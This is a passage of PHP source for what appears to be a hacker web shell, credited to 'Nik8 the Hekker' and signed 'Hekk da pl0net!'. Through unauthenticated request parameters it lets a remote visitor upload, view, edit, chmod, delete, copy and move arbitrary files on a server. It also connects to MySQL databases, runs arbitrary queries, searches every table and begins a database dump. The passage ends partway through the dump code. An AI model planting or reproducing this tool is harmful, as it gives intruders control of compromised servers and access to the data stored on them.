"Nik8 the Hekker",
"_1nf3ct0r_ the Father",
"Industry of Death the betatest0r =)",
"",
"Thanks to:",
"Dunhill the cigarettes, Tuborg the beer, PHP the language, Nescafe the Coffee, Psychedelic the Music",
"",
"Wartime testers & debuggers ::: =))) :::",
"MINDGROW",
"",
"",
"Hekk da pl0net!",
"--- EOF ---"
);
var speed=40;var index=0; text_pos=0;var str_length=tl[0].length;var contents, row;
function type_text()
{contents='';row=Math.max(0,index-50);
while(row<index) contents += tl[row++] + '\r\n';
document.getElementById("LolBox").value = contents + tl[index].substring(0,text_pos)+'|';
if(text_pos++==str_length)
	{text_pos=0;index++;
	if(index!=tl.length)
	{str_length=tl[index].length;setTimeout("type_text()",1000);
	}
	} else setTimeout("type_text()",speed);
}type_text();
//-->
</SCRIPT>
	<?php
	}


		###################################

########
########   Upload file
########
if ($_GET['dxmode']=='UPL')
	{
	if (empty($_POST['dxdir']) AND empty($_GET['dxdir'])) die(DxError('Uploading without selecting directory $_POST/$_GET[\'dxdir\'] is restricted'));

	if (isset($_FILES['dx_uplfile']['tmp_name']))
		{
		$GETFILE=file_get_contents($_FILES['dx_uplfile']['tmp_name']);
		DxFiles_UploadHere($_POST['DxFTP_FileTO'], $_FILES['dx_uplfile']['name'], $GETFILE);
		}
		else
		{
		print "\n".'<form action="'.DxURL('leave','dxmode,dxsimple').'" enctype="multipart/form-data" method=POST>';
		print "\n".'<input type="hidden" name="MAX_FILE_SIZE" value="'.$GLOB['PHP']['upload_max_filesize'].'">';
		print "\n".'<font class="highlight_txt">Max: '.DxStr_FmtFileSize($GLOB['PHP']['upload_max_filesize']).'</font>';
		print "\n".'<br><input type=text name="dxdir" value="'.$_GET['dxdir'].'" SIZE=50>';
		print "\n".'<br><input type=file name="dx_uplfile" SIZE=50>';
		print "\n".'<input type=submit value="Upload" class="submit"></form>';
		}
	}

		###################################

########
########   Directory listings
########
if ($_GET['dxmode']=='DIR')
	{
	if (empty($_GET['dxdir'])) $_GET['dxdir']=realpath($GLOB['FILES']['CurDIR']);
	$_GET['dxdir']=DxFileOkaySlashes($_GET['dxdir']);
	if (substr($_GET['dxdir'], -1,1)!='/') $_GET['dxdir'].='/';

	print "\n".'<br><form action="'.DxURL('kill', '').'" method=GET style="display:inline;">';
	DxGETinForm('leave', 'dxmode');
	print "\n".'<input type=text name="dxdir" value="'.DxFileOkaySlashes(realpath($_GET['dxdir'])).'" SIZE=40>';
	print "\n".'<input type=submit value="Goto" class="submit"></form>';

	print "\n".'<br>'.'<b>&gt;&gt; <b>'.$_GET['dxdir'].'</b>';
	if (!file_exists($_GET['dxdir'])) die(DxError('No such directory'));
	if (!is_dir($_GET['dxdir'])) 	  die(DxError('It\'s a file!! What do you think about listing files in a file? =)) '));

	if (isset($_GET['dxparam']))
		{		if ($_GET['dxparam']=='mkDIR')  if (	!mkdir($_GET['dxdir'].'__DxS_NEWDIR__'.DxRandomChars(3))	) DxError('Unable to mkDir. Perms?');
		if ($_GET['dxparam']=='mkFILE') if (	!touch($_GET['dxdir'].'__DxS_NEWDIR__'.DxRandomChars(3))	) DxError('Unable to mkFile. Perms?');
		}

	if (!($dir_ptr=opendir($_GET['dxdir']))) die(DxError('Unable to open dir for reading. Perms?...'));
	$FILES=array('DIRS' => array(), 'FILES' => array());
	while (!is_bool( $file = readdir($dir_ptr)  ) )
		if (($file!='.') and ($file!='..'))		if (is_dir($_GET['dxdir'].$file)) $FILES['DIRS'][]=$file; else $FILES['FILES'][]=$file;
	asort($FILES['DIRS']);asort($FILES['FILES']);

	print "\n".'<span style="position:absolute;right:0pt;">';
	if (isset($_GET['dxdirsimple']))	print '<a href="'.DxURL('kill', 'dxdirsimple').'">[Switch to FULL]</a>';
		else					print '<a href="'.DxURL('leave', '').'&dxdirsimple=1">[Switch to LITE]</a>';
	print '</span>';

	$folderup_link=explode('/',$_GET['dxdir'].'../');
	if (!empty($folderup_link[   count($folderup_link)-3   ]) AND ($folderup_link[   count($folderup_link)-3   ]!='..'))
		unset($folderup_link[   count($folderup_link)-3   ], $folderup_link[   count($folderup_link)-1   ]);
	$folderup_link=implode('/', $folderup_link);
	print "\n".str_repeat('&nbsp;',3).'<a href="'.DxURL('leave', 'dxdirsimple').'&dxmode=DIR&dxdir='.$folderup_link.'" class=no>'
						.DxImg('foldup').' ../</a>';

	print "\n".str_repeat('&nbsp;', 15).'<font class=highlight_txt>MAKE: </font>'
		.'<a href="'.DxURL('leave', 'dxmode,dxdir,dxdirsimple').'&dxparam=mkDIR">Dir</a>'
		.' / '
		.'<a href="'.DxURL('leave', 'dxmode,dxdir,dxdirsimple').'&dxparam=mkFILE">File</a>'
		.' / '.str_repeat('&nbsp;',5)
		.'<font class=highlight_txt>UPLOAD: </font>'
		.'<a href="'.DxURL('leave', 'dxdirsimple').'&dxdir='.DxFileToUrl($_GET['dxdir']).'&dxmode=UPL">Form</a>'
		.' / '
		.'<a href="'.DxURL('leave', 'dxdirsimple').'&dxdir='.DxFileToUrl($_GET['dxdir']).'&dxmode=UPL">FTP</a>'
		;

	print "\n".'<br>'.count($FILES['DIRS']).' dirs, '.count($FILES['FILES']).' files ';
	print "\n".'<table border=0 cellspacing=0 cellpadding=0 ><COL span=15 class="linelisting">';
	for ($NOWi=0;$NOWi<=1;$NOWi++)
		for ($NOW=($NOWi==0)?'DIRS':'FILES', $i=0;$i<count($FILES[$NOW]);$i++)
			{			$cur=&$FILES[$NOW][$i];
			$dircur=$_GET['dxdir'].$cur;
			print "\n".'<tr>';
			print "\n\t".'<td class=linelisting '.((isset($_GET['dxdirsimple']) AND ($NOW=='DIRS'))?'colspan=2':'').'>'
							.(($NOW=='DIRS')?DxImg('folder').' '
							.				 '<a href="'.DxURL('leave', 'dxdirsimple').'&dxmode=DIR&dxdir='.DxFileToUrl($dircur).'" class=no>':'')
							.(($NOW=='FILES')?'<a href="'.DxURL('kill', '').'&dxmode=F_VIEW&dxfile='.DxFileToUrl($dircur).'" class=no>':'')
							.htmlspecialchars($cur).'</td>';

			if (!isset($_GET['dxdirsimple']))
				{
				print "\n\t".'<td class=linelisting>'
					.'<span '.DxDesign_DrawBubbleBox('File Info',    '<b>Create time:</b><br>'.DxDate(@filectime($dircur)).'<br>'
															 		.'<b>Modify time:</b><br>'. DxDate(@filemtime($dircur)).'<br>'
															 		.'<b>Owner/Group:</b><br>'.(@fileowner($dircur)).' / '.(@filegroup($dircur))
															 		, 150).' class=Hover><b>INFO</span> </td>';
				print "\n\t".'<td class=linelisting '.(($NOW=='DIRS')?'colspan=2':'').'>'
					.((($i+$NOWi)==0)?'<span '.DxDesign_DrawBubbleBox('Perms legend', '1st: sticky bit:<br>"<b>S</b>" Socket, "<b>L</b>" Symbolic Link, "<b>&lt;empty&gt;</b>" Regular, "<b>B</b>" Block special, "<b>D</b>" Directory, "<b>C</b>" Character special, "<b>P</b>" FIFO Pipe, "<b>?</b>" Unknown<br>Others: Owner/Group/World<br>"<b>r</b>" Read, "<b>w</b>" Write, "<b>x</b>" Execute<br><br><b>Click to CHMOD', 400).' class=Hover>':'')
					.'<a href="'.DxURL('kill', '').'&dxmode=F_CHM&dxfile='.DxFileToUrl($dircur).'" class=no>'.DxChmod_Oct2Str(@fileperms($dircur)).'</td>';
				}

			if ($NOW!='DIRS') print "\n\t".'<td class=linelisting style="text-align:right;">'.DxStr_FmtFileSize(@filesize($dircur)).'</td>';

			if (!isset($_GET['dxdirsimple']))
				{
				if ($NOW=='DIRS') print "\n\t".'<td class=linelisting colspan='.(($GLOB['SYS']['GZIP']['IMG'])?'4':'3').'>&nbsp;</td>';
				if ($NOW!='DIRS') print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_DWN&dxparam=SRC&dxfile='.DxFileToUrl($dircur).'" target=_blank>'.DxImg('view').'</a></td>';
				if ($NOW!='DIRS') print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_ED&dxfile='.DxFileToUrl($dircur).'">'.DxImg('ed').'</a></td>';
				if ($NOW!='DIRS') print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_DWN&dxfile='.DxFileToUrl($dircur).'">'.DxImg('downl').'</a></td>';
				if (($NOW!='DIRS') AND ($GLOB['SYS']['GZIP']['IMG'])) print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_DWN&dx_gzip=Yeah&dxfile='.DxFileToUrl($dircur).'">'.DxImg('gzip').'</a></td>';
				print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_REN&dxfile='.DxFileToUrl($dircur).'">'.DxImg('rename').'</a></td>';
				print "\n\t".'<td class=linelisting '.(($NOW=='DIRS')?'colspan=3':'').'><a href="'.DxURL('kill', '').'&dxmode=F_DEL&dxfile='.DxFileToUrl($dircur).'">'.DxImg('del').'</a></td>';
				if ($NOW!='DIRS') print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_COP&dxfile='.DxFileToUrl($dircur).'">'.DxImg('copy').'</a></td>';
				if ($NOW!='DIRS') print "\n\t".'<td class=linelisting><a href="'.DxURL('kill', '').'&dxmode=F_MOV&dxfile='.DxFileToUrl($dircur).'">'.DxImg('move').'</a></td>';
				}
			print "\n\t".'</tr>';
			}
	print "\n".'</table>';
	}


########
########   File Global Actions
########
if ('F_'==substr($_GET['dxmode'],0,2))
	{	if (empty($_GET['dxfile']))
		{		print "\n".'<form action="'.DxURL('kill', '').'" method=GET>';
		DxGETinForm('leave', '');
		print "\n".'<input type=text name="dxfile" value="" style="width:70%;">';
		print "\n".'<br><input type=submit value="Select" class="submit">';
		print "\n".'</form>';
		}
	if (!file_exists(@$_GET['dxfile']))  die(DxError('No such file'));
	print "\n\n".'<a href="'.DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($_GET['dxfile'])).'">[Go DIR]</a>';
	}

########
########   File CHMOD
########
if ($_GET['dxmode']=='F_CHM')
	{
	if (isset($_GET['dxparam']))
		{		if (chmod($_GET['dxfile'], octdec((int)$_GET['dxparam']))==FALSE)
			print DxError('Chmod "'.$_GET['dxfile'].'" failed');
			else print 'CHMOD( <font class=highlight_txt>'.$_GET['dxfile'].'</b></font> )...<b>OK</b>';
		}
		else
		{		print "\n".'<form action="'.DxURL('kill', '').'" method=GET>';
		DxGETinForm('leave', 'dxmode,dxfile');
		print "\n".'CHMOD( <font class=highlight_txt>'.$_GET['dxfile'].'</font> )';
		print "\n".'<br><input type=text name="dxparam" value="'.
			//decoct(fileperms($_GET['dxfile']))
			substr(sprintf('%o', fileperms($_GET['dxfile'])), -4)
			.'">';
		print "\n".'<input type=submit value="chmod" class="submit"></form>';
		}
	}

########
########   File View
########
if ($_GET['dxmode']=='F_VIEW')
	{
	if (!is_file($_GET['dxfile']))  	die(DxError('Hey! Find out how to read a directory in notepad, and u can call me "Lame" =) '));
	if (!is_readable($_GET['dxfile']))  die(DxError('File is not readable. Perms?...'));

	print "\n".'<table border=0 cellspacing=0 cellpadding=0 align=right><tr>';
	print "\n".'<td><h3>'.$_GET['dxfile'].'</h3></td>';
	print "\n".'<td>'
		.'<a href="'.DxURL('kill', '').'&dxmode=F_DWN&dxparam=SRC&dxfile='.DxFileToUrl($_GET['dxfile']).'" target=_blank>'.DxImg('view').'</a>'
		.'<a href="'.DxURL('kill', '').'&dxmode=F_ED&dxfile='.DxFileToUrl($_GET['dxfile']).'">'.DxImg('ed').'</a>'
		.'<a href="'.DxURL('kill', '').'&dxmode=F_DWN&dxfile='.DxFileToUrl($_GET['dxfile']).'">'.DxImg('downl').'</a>'
		.'<a href="'.DxURL('kill', '').'&dxmode=F_DEL&dxfile='.DxFileToUrl($_GET['dxfile']).'">'.DxImg('del').'</a>'
		.'</td>';
	print "\n".'</tr></table><br>';
	print "\n".'Tip: to view the file "as is" - open the page in <a href="'.DxURL('kill', '').'&dxmode=F_DWN&dxparam=SRC&dxfile='.DxFileToUrl($_GET['dxfile']).'">source</a> (<i>works best in Opera</i>), or <a href="'.DxURL('kill', '').'&dxmode=F_DWN&dxfile='.DxFileToUrl($_GET['dxfile']).'">download</a> this file';

	print "\n\n\n".'<br><hr><!-- File contents goes from here -->'."\n";
	print "\n".'<plaintext>';
	print file_get_contents($_GET['dxfile']);
	die(); /* Plaintext is infinite */
	}

########
########   File Edit
########
if ($_GET['dxmode']=='F_ED')
	{
	if (!is_file($_GET['dxfile']))  	die(DxError('Hey! Find out how to read a directory in notepad, and u can call me "Lame" =) '));
	if (isset($_POST['dxparam']))
		{		if (!is_writable($_GET['dxfile']))  die(DxError('File is not writable. Perms?...'));
		if (($f=fopen($_GET['dxfile'], 'w'))===FALSE) die(DxError('File open for WRITE failed'));
		if (fputs($f, $_POST['dxparam'])===FALSE)	die(DxError('I/O: File write failed'));
		fclose($f);
		print 'File saved OK;';
		}
		else
		{
		if (!is_readable($_GET['dxfile']))  die(DxError('File is not readable. Perms?...'));
		if (!is_writable($_GET['dxfile'])) DxWarning('File is not writable!');		print "\n".'<font class=highlight_txt>'.$_GET['dxfile'].'</font>';
		print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
		print "\n".'<textarea name="dxparam" rows=30 style="width:90%;">'.str_replace(array('<','>'),array('&lt;','&gt;'), file_get_contents($_GET['dxfile'])).'</textarea>';
		print "\n".'<br><input type=submit value="Save" style="width:100pt;height:50pt;font-size:15pt;" class=submit>';
		print "\n".'</form>';
		}
	}

########
########   File Delete
########
if ($_GET['dxmode']=='F_DEL')
	{		if (isset($_GET['dx_ok']))
			{		if ($_GET['dx_ok']=='Yes')
			{			if (	(is_file($_GET['dxfile']) AND !unlink($_GET['dxfile']))  OR  (is_dir($_GET['dxfile']) AND !rmdir($_GET['dxfile']))		)
				print DxError('Unable to delete file. Perms?...<br>');
				else
				{				print "\n".'Delete( <font class=highlight_txt>'.$_GET['dxfile'].'</font> ) <b>OK</b>';
				DxGotoURL(DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($_GET['dxfile'])));
				}
			}
		}
		else
		{
		if (!is_writable($_GET['dxfile'])) DxWarning('File is not writable!');		print "\n".'<form action="'.DxURL('kill', '').'" method=GET>';
		DxGETinForm('leave', 'dxmode,dxfile');
		print "\n".'<table border=0 cellspacing=0 cellpadding=0 align=center><tr><td>'
					."\n".'<font class=achtung>(!)</font> Do you really want to <font class=highlight_txt>DELETE '.$_GET['dxfile'].'</font> ?'
					."\n".'<div align=right><input type=submit name="dx_ok" value="No" class=bt_No><input type=submit name="dx_ok" value="Yes" class=bt_Yes>'
					."\n".'</td></tr></table>';
		print "\n".'</form>';
		}
	}

########
########   File Rename
########
if ($_GET['dxmode']=='F_REN')
	{
	if (isset($_POST['dxparam']))
		{
		if (!rename($_GET['dxfile'], dirname($_GET['dxfile']).'/'.$_POST['dxparam']))
			print DxError('Unable to rename. Perms?...<br>');
			else
			{
			print "\n".'Rename( <font class=highlight_txt>'.$_GET['dxfile'].'</font> -> <font class=highlight_txt>'.dirname($_GET['dxfile']).'/'.$_POST['dxparam'].'</font> ) <b>OK</b>';
			DxGotoURL(DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($_GET['dxfile'])));
			}
		}
		else
		{
		print "\n".'<form action="'.DxURL('leave', 'dxmode,dxfile').'" method=POST>';
		print "\n".'<input type=text name="dxparam" value="'.basename($_GET['dxfile']).'" style="width:80%">';
		print "\n".'<input type=submit value="Rename" class="submit"></form>';
		}
	}

########
########   File Copy
########
if ($_GET['dxmode']=='F_COP')
	{
	if (!is_file($_GET['dxfile'])) die(DxError('Don\'t even think about copuing directories! =))'));

	$newname=$_GET['dxfile'].'__DxS_COPY_'.DxRandomChars(3);
	if (($extpos=strrpos($_GET['dxfile'], '.'))>strrpos($_GET['dxfile'], '/')) /* file has an extension */
		$newname=substr($_GET['dxfile'], 0, $extpos).'__DxS_COPY_'.DxRandomChars(3).substr($_GET['dxfile'], $extpos);
	print $newname;
	if (!copy($_GET['dxfile'], $newname))
		print DxError('Unable to copy. Perms?...<br>');
		else
		{
		print "\n".'Copy( <font class=highlight_txt>'.$_GET['dxfile'].'</font> -> <font class=highlight_txt>'.$newname.'</font> ) <b>OK</b>';
		DxGotoURL(DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($_GET['dxfile'])));
		}
	}

########
########   File Move
########
if ($_GET['dxmode']=='F_MOV')
	{
	if (isset($_POST['dxparam']))
		{
		if (!rename($_GET['dxfile'], $_POST['dxparam']))
			print DxError('Unable to rename. Perms? Or no path?...<br>');
			else
			{
			print "\n".'Move( <font class=highlight_txt>'.$_GET['dxfile'].'</font> -> <font class=highlight_txt>'.$_POST['dxparam'].'</font> ) <b>OK</b>';
			DxGotoURL(DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($_POST['dxparam'])));
			}
		}
		else
		{
		if (!is_writable($_GET['dxfile'])) DxWarning('File is not writable!');
		print "\n".'<form action="'.DxURL('leave', 'dxmode,dxfile').'" method=POST>';
		print "\n".'<input type=text name="dxparam" value="'.DxFileOkaySlashes(realpath($_GET['dxfile'])).'" style="width:80%">';
		print "\n".'<input type=submit value="M0ve" class="submit"></form>';
		}
	}

if (substr($_GET['dxmode'],0,2)=='F_')
	{/* file actions */
	print "\n\n".'<br><br>'.'<a href="'.DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($_GET['dxfile'])).'">[Go DIR]</a>';
	}

		###################################

########
########   SQL Maintenance
########
if ($_GET['dxmode']=='SQL')
	{	if (!isset($_GET['dxsql_s'], $_GET['dxsql_l'], $_GET['dxsql_p']))
		{		print "\n".'<h2>MySQL connection</h2>';
		print "\n".'<form action="'.DxURL('kill', '').'" method=GET align=center>';
		DxGETinForm('leave', 'dxmode');
		print "\n".'<br>Serv: <input type=text name="dxsql_s" value="localhost" style="width:200pt">';
		print "\n".'<br>Login:<input type=text name="dxsql_l" value="" 	 	style="width:200pt">';
		print "\n".'<br>Passw:<input type=password name="dxsql_p" value="" 	style="width:200pt">';
		print "\n".'<br><input type=submit value="C0nnect" class="submit" style="width:200pt;"></form>';
		die();
		}
	if ((mysql_connect($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'])===FALSE) or (mysql_errno()!=0))
		die(DxError('No connection to mysql server!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));
		else print '&gt;&gt; MySQL connected!';

	$mysqlver=mysql_fetch_row(mysql_query("SELECT VERSION()"));
	print str_repeat('&nbsp;',15).'MySQL version: <font class="highlight_txt">'.$mysqlver[0].'</font>';

	DxMySQL_FetchResult(DxMySQLQ('SHOW DATABASES;', true), $DATABASES, true);
	for ($i=0;$i<count($DATABASES);$i++)
		$DATABASES[$i][1]=mysql_num_rows(DxMySQLQ('SHOW TABLES FROM `'.$DATABASES[$i][0].'`;', false));

	print "\n".'<table border=0 cellspacing=0 cellpadding=0>'
				.'<tr><td class=h2_oneline><h1>DB:</h1></td>';
	if (!isset($_GET['dxsql_d']))
		{
		print "\n".'<td class=h2_oneline style="border-width:0pt;">';
		print "\n".'<form action="'.DxURL('kill', '').'" method=GET>';
		DxGETinForm('leave', 'dxmode,dxsql_s,dxsql_l,dxsql_p');
		print "\n".'<SELECT name="dxsql_d" onchange="this.form.submit()">';
		print "\n\t".'<OPTION value="">&lt;Server&gt;</OPTION>';
		for ($i=0;$i<count($DATABASES);$i++)
		print "\n\t".'<OPTION value="'.$DATABASES[$i][0].'">'
			.'['.DxZeroedNumber($DATABASES[$i][1],3).']'.' '.$DATABASES[$i][0]
			.'</OPTION>';
		print "\n".'</SELECT><input type=submit value="-&gt;" class=submit"></form></td>';
		print "\n".'</tr></table>';
		die();
		}
		else print "\n".'<td class=linelisting><font class=highlight_txt>'.((empty($_GET['dxsql_d']))?'&lt;Server&gt;':$_GET['dxsql_d']).'</font></td>'
						.'<td class=linelisting><a href="'.DxURL('kill', 'dxsql_d').'" class=no>[CH]</a></td>'
						.'<td class=linelisting><a href="'.DxURL('kill', 'dxmode').'&dxmode=SQLS" class=no>[Search in tables...]</a></td>'
						.'<td class=linelisting><a href="'.DxURL('kill', 'dxmode').'&dxmode=SQLD" class=no>[Dump...]</a></td>'
						.'</tr></table>';

	if (!empty($_GET['dxsql_d']))
		if (!mysql_select_db($_GET['dxsql_d']))
			die(DxError('Can\'t select database!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));

	print "\n".'<table border=0 cellspacing=0 cellpadding=0 width=100%>';
	print "\n".'<tr><td width=1% class=h2_oneline style="vertical-align:top;">';
	if (!empty($_GET['dxsql_d']))
		{
		print "\n\t".'<table  border=0 cellspacing=0 cellpadding=0>';
		print "\n\t".'<caption>Tables:</caption>';
		DxMySQL_FetchResult(DxMySQLQ('SHOW TABLES;', true), $TABLES, true);
		for ($i=0;$i<count($TABLES);$i++) $TABLES[$i]=$TABLES[$i][0];
		asort($TABLES);
		for ($i=0;$i<count($TABLES);$i++)
			{
			DxMySQL_FetchResult(DxMySQLQ('SELECT COUNT(*) FROM `'.$TABLES[$i].'`;', true), $TRowCnt, true);			print "\n\t".'<tr><td class="listing"><nobr>'.(($TRowCnt[0][0]>0)?'&gt; ':'&nbsp;&nbsp;').$TABLES[$i].'</td></tr>';
			}
		print "\n\t".'</table>';
		}
	print "\n".'</td><td  width=100%>';
	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'[?] Can run several querys if divided by ";"<br>If smth is wrong with charset, write first: SET NAMES cp1251;';
	print "\n".'<textarea name="dxsql_q" rows=10 style="width:100%;">'.((empty($_POST['dxsql_q']))?'':$_POST['dxsql_q']).'</textarea>';
	print "\n".'<div align=right>'
				.'<input type=submit value="Query" class="submit"> '
				.'<input type=submit name="dxparam" value="Download Query" class="submit"></div></form>'
				.'<br>';

	if (empty($_POST['dxsql_q'])) die('</td></tr></table>');
	$_POST['dxsql_q']=explode(';', $_POST['dxsql_q']);

	foreach ($_POST['dxsql_q'] as $CUR_Q)
		{		if (empty($CUR_Q)) continue;
		$CUR_Q.=';';

		$num=DxMySQL_FetchResult(DxMySQLQ($CUR_Q, true), $FETCHED, false);
		if ($num<=0) continue;

		print "\n\n\n".'<table border=0 cellspacing=0 cellpadding=0><caption>'.$CUR_Q.'</caption>';

		$INDEXES=array_keys($FETCHED[0]);
		print "\n\t".'<tr><td class="listing" colspan='.(count($INDEXES)+1).'>&gt;&gt; Fetched: '.$num. str_repeat('&nbsp;', 10). 'Affected: '.mysql_affected_rows().'</td></tr>';
		print "\n\t".'<tr><td class="listing"><div align=center  class="highlight_txt">###</td>';
		foreach ($INDEXES as $key) print '<td class="listing"><div align=center class="highlight_txt">'.$key.'</td>';
		print '</tr>';

		for ($l=0;$l<count($FETCHED);$l++)
			{
			print "\n\t".'<tr><td class="listing" width=40><div align=right class="highlight_txt">'.$l.'</td>';
			for ($i=0; $i<count($INDEXES); $i++)
				print '<td class="listing"> '.DxDecorVar($FETCHED[$l][ $INDEXES[$i] ], true).'</td>';
			}

		print "\n".'</table><br>';
		}
	print "\n".'</td></tr></table>';
	}

########
########   SQL Search
########
if ($_GET['dxmode']=='SQLS')
	{
	if (!isset($_GET['dxsql_s'], $_GET['dxsql_l'], $_GET['dxsql_p'], $_GET['dxsql_d']))	die(DxError('SQL server/login/password/database are not set'));

	if ((mysql_connect($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'])===FALSE) or (mysql_errno()!=0))
		die(DxError('No connection to mysql server!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));
		else print '&gt;&gt; MySQL connected!';

	if (!mysql_select_db($_GET['dxsql_d']))
		die(DxError('Can\'t select database!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));

	print "\n".'<table border=0 cellspacing=0 cellpadding=0><tr><td class=h2_oneline><h2>DB:</h2></td>';
	print "\n".'<td class=linelisting><font class=highlight_txt>'.((empty($_GET['dxsql_d']))?'&lt;Server&gt;':$_GET['dxsql_d']).'</font></td></tr></table>';

	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';	print "\n".'<table border=0 cellspacing=0 cellpadding=0 width=100%>';
	print "\n".'<tr><td width=1% class=h2_oneline style="vertical-align:top;">';

	DxMySQL_FetchResult(DxMySQLQ('SHOW TABLES;', true), $TABLES, true);
	for ($i=0;$i<count($TABLES);$i++) $TABLES[$i]=$TABLES[$i][0];
	asort($TABLES);

	if (isset($_POST['dxsqlsearch']['txt']))
		if (get_magic_quotes_gpc()==1) $_POST['dxsqlsearch']['txt']=stripslashes($_POST['dxsqlsearch']['txt']);

	print "\n\t".'<SELECT MULTIPLE name="dxsqlsearch[tables][]" SIZE=30>';
	for ($i=0;$i<count($TABLES);$i++)
		{
		DxMySQL_FetchResult(DxMySQLQ('SELECT COUNT(*) FROM `'.$TABLES[$i].'`;', true), $TRowCnt, true);
		if ($TRowCnt[0][0]>0)
			print "\n\t".'<OPTION value="'.$TABLES[$i].'" '
				.(  (isset($_POST['dxsqlsearch']['tables']))?   ((in_array($TABLES[$i], $_POST['dxsqlsearch']['tables']))?'SELECTED':'')   :'SELECTED'  ).'>'
				.$TABLES[$i].'</OPTION>';
		}
	print "\n\t".'</SELECT>';
	print "\n".'</td><td  width=100%>';
	print "\n".'<input type=text name="dxsqlsearch[txt]" style="width:100%;" value="'.((empty($_POST['dxsqlsearch']['txt']))?'':str_replace('"', '&quot;', $_POST['dxsqlsearch']['txt'])).'">';
	print "\n".'<br>';
	foreach (array('Any', 'Each', 'Exact', 'RegExp') as $cur_rad)
		print '<input type=radio name="dxsqlsearch[mode]" value="'.strtolower($cur_rad).'" '
			.(  (isset($_POST['dxsqlsearch']['mode']))?   (($_POST['dxsqlsearch']['mode']==strtolower($cur_rad))?'CHECKED':'')   :(($cur_rad=='Any')?'CHECKED':'')  )
			.' class=radio>'.$cur_rad.'&nbsp;&nbsp;&nbsp;';
	print "\n".'<div align=right><input type=submit value="Search..." class=submit style="width:100pt;"></div>';
	print "\n".'</form>';

	if (!isset($_POST['dxsqlsearch'])) die('</td></tr></table>');

	if (empty($_POST['dxsqlsearch']['tables'])) die(DxError('No tables selected'));

	if (in_array($_POST['dxsqlsearch']['mode'], array('any', 'each'))) $_POST['dxsqlsearch']['txt']=explode(' ', mysql_real_escape_string($_POST['dxsqlsearch']['txt']));
		else $_POST['dxsqlsearch']['txt']=array($_POST['dxsqlsearch']['txt']);


	$GLOBALFOUND=0;
	foreach ($_POST['dxsqlsearch']['tables'] as $CUR_TABLE)
		{		$Q='SELECT * FROM `'.$CUR_TABLE.'` WHERE ';
		$Q_ARR=array();
		DxMySQL_FetchResult(DxMySQLQ('SHOW COLUMNS FROM `'.$CUR_TABLE.'`;', true), $COLS, true);   for ($i=0; $i<count($COLS);$i++) $COLS[$i]=$COLS[$i][0];
		foreach ($COLS as $CUR_COL)
			{			if (in_array($_POST['dxsqlsearch']['mode'], array('any', 'each', 'exact')))
				{				for ($i=0;$i<count($_POST['dxsqlsearch']['txt']);$i++)
				$Q_ARR[]=$CUR_COL.' LIKE "%'.($_POST['dxsqlsearch']['txt'][$i]).'%"';
				}
				else $Q_ARR[]=$CUR_COL.' REGEXP '.$_POST['dxsqlsearch']['txt'][0];

			if ($_POST['dxsqlsearch']['mode']=='each')
				{				$Q_ARR_EXACT[]=implode(' AND ', $Q_ARR);
				$Q_ARR=array();
				}
			}
		if (in_array($_POST['dxsqlsearch']['mode'], array('any', 'exact'))) $Q.=implode(' OR ', $Q_ARR).';';
		if ($_POST['dxsqlsearch']['mode']=='each') $Q.=' ( '.implode(' ) OR ( ', $Q_ARR_EXACT).' );';
		if ($_POST['dxsqlsearch']['mode']=='regexp') $Q.=' ( '.implode(' ) OR ( ',$Q_ARR).' );';

		/* $Q is ready */

		if (($num=DxMySQL_FetchResult(DxMySQLQ($Q, true), $FETCHED, true))>0)
			{
			$GLOBALFOUND+=$num;			print "\n\n".'<table border=0 cellspacing=0 cellpadding=0 align=center><caption>'.$num.' matched in '.$CUR_TABLE.' :</caption>';
			print "\n\t".'<tr><td class=listing><font class="highlight_txt">'.implode('</td><td class=listing><font class="highlight_txt">', $COLS).'</td></tr>';
			for ($l=0;$l<count($FETCHED);$l++)
				{
				print "\n\t".'<tr>';
				for ($i=0; $i<count($FETCHED[$l]); $i++) print '<td class="listing"> '.DxDecorVar($FETCHED[$l][$i], true).'</td>';
				print '</tr>';
				}
			print "\n".'</table><br>';
			}
		}
	print "\n".'<br>Total: '.$GLOBALFOUND.' matches';

	print "\n".'</td></tr></table>';
	}

########
########   SQL Dump
########
if ($_GET['dxmode']=='SQLD')
	{	if (!isset($_GET['dxsql_s'], $_GET['dxsql_l'], $_GET['dxsql_p'], $_GET['dxsql_d']))	die(DxError('SQL server/login/password/database are not set'));

	if ((mysql_connect($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'])===FALSE) or (mysql_errno()!=0))
		die(DxError('No connection to mysql server!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));
		else print '&gt;&gt; MySQL connected!';

	if (!mysql_select_db($_GET['dxsql_d']))
		die(DxError('Can\'t select database!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));

	print "\n".'<table border=0 cellspacing=0 cellpadding=0><tr><td class=h2_oneline><h2>DB:</h2></td>';
	print "\n".'<td class=linelisting><font class=highlight_txt>'.((empty($_GET['dxsql_d']))?'&lt;Server&gt;':$_GET['dxsql_d']).'</font></td></tr></table>';

	print "\n".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<table border=0 cellspacing=0 cellpadding=0 width=100%>';
